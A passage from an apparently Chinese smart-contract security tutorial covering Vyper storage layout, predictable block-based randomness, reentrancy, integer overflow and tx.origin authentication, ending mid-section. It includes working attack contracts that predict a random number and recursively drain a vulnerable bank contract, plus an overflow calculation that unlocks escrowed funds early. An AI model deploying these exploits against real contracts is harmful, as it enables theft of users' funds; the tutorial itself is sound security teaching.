function_">log</span>(content)</span><br><span class="line">    <span class="comment">// const value = web3.utils.hexToString(content)</span></span><br><span class="line">    <span class="comment">// console.log(value)</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<h5 id="动态数组">动态数组</h5>
<p>Vyper
的动态数组的实现是通过定长数组实现的，数据排布格式与定长数组是类似的。</p>
<h5 id="映射类型-1">映射类型</h5>
<p>在 Vyper 的映射类型为 <code>HashMap</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">qsdz: HashMap[uint256, String[<span class="number">32</span>]]</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    self.qsdz[<span class="number">12345</span>] = <span class="string">&quot;yyds&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@pure</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() -&gt; String[<span class="number">32</span>]:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<p>对于映射值的索引计算与 Solidity 是相反的，公式为
<code>keccak256(position+h(key))</code></p>
<p>一个可能的 ts 代码如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里的address是合约地址</span></span><br><span class="line">    <span class="keyword">const</span> address = <span class="string">&#x27;0xd9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line">    <span class="comment">// 这是映射键的值</span></span><br><span class="line">    <span class="keyword">const</span> key = <span class="number">12345</span></span><br><span class="line">    <span class="comment">// 映射变量所在的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> slotNumber = <span class="number">0</span></span><br><span class="line">    <span class="comment">// 计算映射值的插槽索引</span></span><br><span class="line">    <span class="keyword">const</span> idx = web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;uint&quot;</span>, <span class="attr">value</span>:slotNumber&#125;,</span><br><span class="line">                                        &#123;<span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span>, <span class="attr">value</span>: key&#125;)</span><br><span class="line">    <span class="keyword">const</span> slot = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address, idx)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(slot)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<h3 id="随机性">随机性</h3>
<h4 id="原理">原理</h4>
<p>随机数在以太坊中是十分重要的，因为其中大部分智能合约都可以归类为游戏，而游戏往往依赖于随机性，例如最简单的猜硬币正反面。</p>
<p>由于以太坊是一个确定性的图灵机，不涉及固有的随机性，即在合约代码运行之前，以太坊中的状态都是既定的，可预测的。</p>
<p>同时，对于区块链而言，大多数矿工在评估交易时必须获得相同的结果才能达成共识，共识也是区块链技术的支柱之一，随机性意味着所有节点之间不可能达成一致。</p>
<p>另外，对于合约而言，合约的内部状态以及区块链的整个历史都是公共可见的。</p>
<p>最容易想到的随机数来源是区块时间戳（<code>block.timestamp</code>），但问题是区块时间戳是受到矿工控制的，使得随机数可预测。</p>
<h4 id="vyper-全局变量">Vyper 全局变量</h4>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 12%">
<col style="width: 63%">
</colgroup>
<thead>
<tr class="header">
<th>变量名</th>
<th>类型</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>block.coinbase</code></td>
<td><code>address</code></td>
<td>挖出当前区块的矿工地址</td>
</tr>
<tr class="even">
<td><code>block.difficulty</code></td>
<td><code>uint256</code></td>
<td>当前块的难度（<code>EVM &lt; Paris</code>），与PoW有关系</td>
</tr>
<tr class="odd">
<td><code>block.prevrandao</code></td>
<td><code>uint256</code></td>
<td>当前区块所依赖的前一个区块的随机数，与PoS有关系</td>
</tr>
<tr class="even">
<td><code>block.number</code></td>
<td><code>uint256</code></td>
<td>当前区块号</td>
</tr>
<tr class="odd">
<td><code>block.prevhash</code></td>
<td><code>bytes32</code></td>
<td>等价于 <code>blockhash(block.number - 1)</code></td>
</tr>
<tr class="even">
<td><code>block.timestamp</code></td>
<td><code>uint256</code></td>
<td>自 unix epoch 起始到当前区块以秒计的时间戳</td>
</tr>
<tr class="odd">
<td><code>chain.id</code></td>
<td><code>uint256</code></td>
<td>当前链的ID</td>
</tr>
<tr class="even">
<td><code>msg.data</code></td>
<td><code>Bytes</code></td>
<td>完整的 calldata</td>
</tr>
<tr class="odd">
<td><code>msg.gas</code></td>
<td><code>uint256</code></td>
<td>剩余的 gas</td>
</tr>
<tr class="even">
<td><code>msg.sender</code></td>
<td><code>address</code></td>
<td>消息发送者（当前调用）</td>
</tr>
<tr class="odd">
<td><code>msg.value</code></td>
<td><code>uint256</code></td>
<td>随消息发送的 wei 的数量</td>
</tr>
<tr class="even">
<td><code>tx.origin</code></td>
<td><code>address</code></td>
<td>交易发起者（完全的调用链）</td>
</tr>
<tr class="odd">
<td><code>tx.gasprice</code></td>
<td><code>uint256</code></td>
<td>随消息发送的 wei 的数量</td>
</tr>
</tbody>
</table>
<h4 id="solidity-全局变量">Solidity 全局变量</h4>
<table>
<colgroup>
<col style="width: 18%">
<col style="width: 17%">
<col style="width: 63%">
</colgroup>
<thead>
<tr class="header">
<th>变量名</th>
<th>类型</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>block.coinbase</code></td>
<td><code>address payable</code></td>
<td>挖出当前区块的矿工地址</td>
</tr>
<tr class="even">
<td><code>block.basefee</code></td>
<td><code>uint256</code></td>
<td>当前区块的基本费用 （ <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3198">EIP-3198</a> 和 <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1559">EIP-1559</a>）</td>
</tr>
<tr class="odd">
<td><code>block.difficulty</code></td>
<td><code>uint256</code></td>
<td>当前块的难度（<code>EVM &lt; Paris</code>），与PoW有关系</td>
</tr>
<tr class="even">
<td><code>block.prevrandao</code></td>
<td><code>uint256</code></td>
<td>当前区块所依赖的前一个区块的随机数，与PoS有关系</td>
</tr>
<tr class="odd">
<td><code>block.number</code></td>
<td><code>uint256</code></td>
<td>当前区块号</td>
</tr>
<tr class="even">
<td><code>block.prevhash</code></td>
<td><code>bytes32</code></td>
<td>等价于 <code>blockhash(block.number - 1)</code></td>
</tr>
<tr class="odd">
<td><code>block.gaslimit</code></td>
<td><code>uint256</code></td>
<td>当前区块 gas 限额</td>
</tr>
<tr class="even">
<td><code>block.timestamp</code></td>
<td><code>uint256</code></td>
<td>自 unix epoch 起始到当前区块以秒计的时间戳</td>
</tr>
<tr class="odd">
<td><code>block.chainid</code></td>
<td><code>uint256</code></td>
<td>当前链的ID</td>
</tr>
<tr class="even">
<td><code>msg.data</code></td>
<td><code>bytes calldata</code></td>
<td>完整的 calldata</td>
</tr>
<tr class="odd">
<td><code>msg.sig</code></td>
<td><code>bytes4</code></td>
<td>calldata 的前 4 字节（也就是函数标识符）</td>
</tr>
<tr class="even">
<td><code>gasleft()</code></td>
<td><code>uint256</code></td>
<td>剩余的 gas</td>
</tr>
<tr class="odd">
<td><code>msg.sender</code></td>
<td><code>address</code></td>
<td>消息发送者（当前调用）</td>
</tr>
<tr class="even">
<td><code>msg.value</code></td>
<td><code>uint256</code></td>
<td>随消息发送的 wei 的数量</td>
</tr>
<tr class="odd">
<td><code>tx.origin</code></td>
<td><code>address</code></td>
<td>交易发起者（完全的调用链）</td>
</tr>
<tr class="even">
<td><code>tx.gasprice</code></td>
<td><code>uint256</code></td>
<td>随消息发送的 wei 的数量</td>
</tr>
</tbody>
</table>
<blockquote>
<p>在 Solidity 中，<code>block.difficulty</code> 和
<code>block.prevrandao</code>
是一个变量，以太坊1.0是PoW，以太坊2.0是PoS，<code>difficulty</code>
命名被重用。<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-4399">EIP-4399</a></p>
</blockquote>
<h4 id="示例">示例</h4>
<p>一个比较经典的合约随机数生成算法如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@view</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRandomNumber</span>() -&gt; bytes32:</span><br><span class="line">    <span class="keyword">return</span> keccak256(_abi_encode(block.prevhash, block.timestamp))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以在本地电脑中安装 vyper 生成 interface：</p>
<p><code>vyper -f external_interface example.vy</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Example:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNumber</span>() -&gt; bytes32: view</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们可以写出以下攻击合约：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Example:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNumber</span>() -&gt; bytes32: view</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@view</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">c: address</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    number: bytes32 = Example(c).getRandomNumber()</span><br><span class="line">    myNumber: bytes32 = keccak256(_abi_encode(block.prevhash, block.timestamp))</span><br><span class="line">    <span class="keyword">return</span> number == myNumber</span><br></pre></td></tr></table></figure>
<p>这是因为同一个交易下的区块状态一定是相同的。</p>
<p>对于 Solidity 的随机数合约是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    function getRandomNumber() external view returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encode(blockhash(block.number - 1), block.timestamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击合约一致。</p>
<h4 id="chainlink-vrf">Chainlink VRF</h4>
<p>Chainlink VRF(Verifiable Random Function)
是一种可证明公平且可验证的随机数生成器（RNG）。</p>
<p>通过以太坊的预言机（Oracle）模式可以接入 Chainlink VRF
以获取相对安全的随机数。Chainlink VRF
提供了一种可验证的随机数生成机制，可以在智能合约中获取随机数，同时保证随机数的公正性和不可预测性。</p>
<p>可以参考链接：<a target="_blank" rel="noopener" href="https://docs.chain.link/vrf/v2/direct-funding/examples/test-locally">https://docs.chain.link/vrf/v2/direct-funding/examples/test-locally</a></p>
<h3 id="重入">重入</h3>
<p>在一个合约 A 与另一个合约 B
进行交互时，此时任何形式的以太币转移都会将 EVM 控制权交给合约 B。</p>
<blockquote>
<p>任何形式的以太币转义包括但不限于转账（<code>send</code>，<code>transfer</code>）和函数调用。</p>
</blockquote>
<p>比如说一个拥有存款、取款的合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">balances: public(HashMap[address, uint256])</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deposit</span>():</span><br><span class="line">    self.balances[msg.sender] += msg.value</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>():</span><br><span class="line">    <span class="keyword">assert</span> self.balances[msg.sender] &gt; <span class="number">0</span>, <span class="string">&quot;No balance&quot;</span></span><br><span class="line">    send(msg.sender, self.balances[msg.sender])</span><br><span class="line">    self.balances[msg.sender] = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>很简单的一份代码，使用一个 <code>HashMap</code>
保存每个人账户的余额，使用 <code>deposit</code> 进行存款，使用
<code>withdraw</code> 进行取款。</p>
<p>但需要注意的是，<code>self.balances[msg.sender] = 0</code> 在
<code>send</code> 前后会出现很大区别，因为如果 <code>msg.sender</code>
是合约，<code>send</code> 函数会去寻找该合约的 <code>fallback</code>
函数（在 Vyper 中是
<code>__defalut__</code>）进行处理，这意味着在金额转移时，<strong>控制权交给了另一个合约</strong>。</p>
<p>此时如果重新调用 <code>withdraw</code>
函数，<strong>断言验证是通过的</strong>，意味着我们重入（Re-entrancy）了。</p>
<p>假设我们写下如下攻击代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Example:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deposit</span>(): payable</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">withdraw</span>(): nonpayable</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">balances</span>(<span class="params">arg0: address</span>) -&gt; uint256: view</span><br><span class="line"></span><br><span class="line">victim: address</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">_victim: address</span>):</span><br><span class="line">    <span class="comment"># Init victim contract address</span></span><br><span class="line">    self.victim = _victim</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="comment"># Need some initial funds</span></span><br><span class="line">    <span class="keyword">assert</span> msg.value &gt; <span class="number">0</span>, <span class="string">&quot;No value&quot;</span></span><br><span class="line">    <span class="comment"># First deposit some funds</span></span><br><span class="line">    Example(self.victim).deposit(value=msg.value)</span><br><span class="line">    <span class="comment"># Then withdraw to active recursion</span></span><br><span class="line">    Example(self.victim).withdraw()</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>():</span><br><span class="line">    <span class="comment"># Get the all ethers</span></span><br><span class="line">    send(msg.sender, self.balance)</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__default__</span>():</span><br><span class="line">    <span class="comment"># if victim contract has remain ehters, GET!</span></span><br><span class="line">    <span class="keyword">if</span> self.victim.balance &gt;= msg.value:</span><br><span class="line">        Example(self.victim).withdraw()</span><br></pre></td></tr></table></figure>
<p>在攻击开始，我们首先要使用该合约在银行（<code>Example</code>）中存储余额，才可以进行
<code>withdraw</code>。</p>
<p>通过调用 <code>withdraw</code> 函数，使得其触发该合约的
<code>__default__</code>
函数，此时合约再次调用银行（<code>Example</code>）的
<code>withdraw</code> 函数，在
<code>self.balances[msg.sender] = 0</code>
没有执行前，断言都将成立，故此时递归式获取到所有目标合约的余额，完成攻击。</p>
<blockquote>
<p>这里需要注意，<code>msg</code> 相关的值式与调用者绑定的，即在这里的
<code>msg.sender</code> 是 <code>Attacker</code> 合约本身。</p>
</blockquote>
<p>不过，当你进行尝试时，会发现产生报错，这是由于 gas 限制导致的！</p>
<p>为了防止重入攻击，以太坊官方对 <code>send</code>
做了限额，且不继承交易的 gas，仅可使用 2300
gas（津贴形式），这使得几乎除了输出日志外的其他操作都将失败（会产生revert）。</p>
<p>但是这是十分不实际的，比如说一个自动化交易、投资的智能合约（DeFi）需要在退款（或投资失败）时进行二次投资，此时合约需要大量的
gas 来做操作，<code>send</code> 的限制会阻碍到合约的扩展性。</p>
<p>在 Solidity 遇到这种情况会建议使用 <code>call</code> 直接发送
ether，而 Vyper 为 <code>send</code> 开放了 <code>gas</code>
参数，可以为 <code>send</code> 附加额外的 gas
以便于智能合约执行必要操作。</p>
<blockquote>
<p>Vyper 也有类似于 <code>call</code> 的 <code>raw_call</code>
函数。</p>
</blockquote>
<p>例如一个存在重入漏洞的代码是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">balances: public(HashMap[address, uint256])</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deposit</span>():</span><br><span class="line">    self.balances[msg.sender] += msg.value</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>():</span><br><span class="line">    <span class="keyword">assert</span> self.balances[msg.sender] &gt; <span class="number">0</span>, <span class="string">&quot;No balance&quot;</span></span><br><span class="line">    send(msg.sender, self.balances[msg.sender], gas=msg.gas)</span><br><span class="line">    <span class="comment"># raw_call(msg.sender, b&quot;&quot;, value=self.balances[msg.sender])</span></span><br><span class="line">    self.balances[msg.sender] = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>Solidity
在开发层面上需要开发者做额外操作，第一是建议使用检查-生效-交互（Checks-Effects-Interactions）模式，即
<code>self.balances[msg.sender] = 0</code> 写在 <code>send</code>
之后。</p>
<p>第二是建议使用哨兵模式，即写入存储一个
<code>guard</code>，类似于互斥锁的逻辑，保证不会被二次调用。</p>
<blockquote>
<p>一般来说建议二者都是用， 因为可能还会存在跨函数重入的情况。</p>
</blockquote>
<p>Vyper 与 Solidity
不同，为开发者提供了哨兵模式在语言层面的支持，使用装饰器
<code>nonreentrant</code> 就可以为一个函数上锁，例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@nonreentrant(<span class="params"><span class="string">&quot;withdraw&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>():</span><br><span class="line">    <span class="keyword">assert</span> self.balances[msg.sender] &gt; <span class="number">0</span>, <span class="string">&quot;No balance&quot;</span></span><br><span class="line">    send(msg.sender, self.balances[msg.sender], gas=msg.gas)</span><br><span class="line">    self.balances[msg.sender] = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这样就避免了重入。</p>
<blockquote>
<p>需要注意的是，在 ^0.3.0 的版本中需要给 <code>nonreentrant</code>
提供一个唯一的 <code>key</code>，但在 ^0.4.0 后不需要。</p>
</blockquote>
<p>在重入时需要注意，重入的<strong>初始资金</strong>（initial
funds）不能太小，否则在没有满足退出递归的条件
<code>self.victim.balance &lt; msg.value</code> 之前会<strong>耗尽
gas</strong>（或者<strong>超出了区块的 gas
限制</strong>，或者<strong>超出了 EVM 的 1024
大小的栈</strong>），使得重入失败。不过可以通过修改退出递归的条件提前结束递归。</p>
<p>重入最大的问题在于，攻击者仅需付出少量的资金，就可以得到大量的收获。攻击者可以通过部署多个合约的方式掏空合约资金，这是十分危险的。</p>
<blockquote>
<p>Solidity 的漏洞合约可能为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;No balance&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: balances[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果取款函数是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">balances: public(HashMap[address, uint256])</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deposit</span>():</span><br><span class="line">    self.balances[msg.sender] += msg.value</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>(<span class="params">amount: uint256</span>):</span><br><span class="line">    <span class="keyword">assert</span> self.balances[msg.sender] &gt;= amount, <span class="string">&quot;No balance&quot;</span></span><br><span class="line">    send(msg.sender, amount, gas=msg.gas)</span><br><span class="line">    self.balances[msg.sender] -= amount</span><br></pre></td></tr></table></figure>
<p>由于 <code>self.balances[msg.sender] -= amount</code> 的问题，在
Vyper 和新版本的 Solidity
中都会检查算数溢出，所以还需结合算术溢出漏洞进行攻击。</p>
<h3 id="算数溢出">算数溢出</h3>
<p>EVM 的栈元素只有 256 位，这意味着如果在进行算数时如果算数结果超过 256
位，那么结果存入栈时将会被截断，产生意料之外的结果。这种情况被称为<strong>算术溢出</strong>。</p>
<p>在 Solidity 0.8.0 版本之前，所有算术溢出结果将不会被检查；在 0.8.0
以后，所有算术溢出结果将抛出 <code>Panic</code> 异常；在 Vyper
中所有算数溢出都将 revert。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &lt;<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    uint256 public locktime;</span><br><span class="line">    function assure() external payable &#123;</span><br><span class="line">        require(locktime == <span class="number">0</span>, <span class="string">&quot;Already assured some funds&quot;</span>);</span><br><span class="line">        require(msg.value &gt; <span class="number">0</span>, <span class="string">&quot;Need some funds to assure&quot;</span>);</span><br><span class="line">        locktime = block.timestamp + <span class="number">1</span> days;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delay(uint256 day) external &#123;</span><br><span class="line">        locktime += day * <span class="number">1</span> days;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        require(locktime &lt; block.timestamp, <span class="string">&quot;It&#x27;s not time yet&quot;</span>);</span><br><span class="line">        locktime = <span class="number">0</span>;</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个简单的担保合同，保证资金锁定一天以上，如果需要延保还可以调用
<code>delay</code> 函数延迟时间。</p>
<p>部署合约，在这里我们可以尝试担保 1 ether</p>
<figure>
<img src="/smart-contract-note/overflow.png" alt="overflow">
<figcaption aria-hidden="true">overflow</figcaption>
</figure>
<p>获取到时间戳 <code>1709363247</code>，使用 Python 计算
<code>delay = (2 ** 256 - locktime) // oneday + 1</code>，得到需要 delay
的天数为
<code>1340186218024493002587627141304258192746180378074543565271499814906382180</code></p>
<figure>
<img src="/smart-contract-note/overflow-1709277023926-3.png" alt="overflow">
<figcaption aria-hidden="true">overflow</figcaption>
</figure>
<p>可以发现，<code>locktime</code>
发生上溢，此时我们可以提前拿出担保资金，破坏了合约本来的功能。</p>
<h3 id="身份验证">身份验证</h3>
<p>永远不要使用 <code>tx.origin</code>
做身份验证，比如说有这么一个钱包合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">owner: address</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    self.owner = msg.sender</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transferTo</span>(<span class="params">dest: address, amount: uint256</span>):</span><br><span class="line">    <span class="keyword">assert</span> tx.origin == self.owner, <span class="string">&quot;No permission&quot;</span></span><br><span class="line">    raw_call(dest, <span class="string">b&quot;&quot;</span>, value=amount)</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__default__</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>raw_call</code> 是为了能够使得钱包给合约转账。</p>
<p>如果说你向恶意合约发送了交易，恶意合约可以将交易跳转回
<code>transferTo</code> 函数，同时能保证断言通过。</p>
<p>比如说伪造一个钱包合约</p>
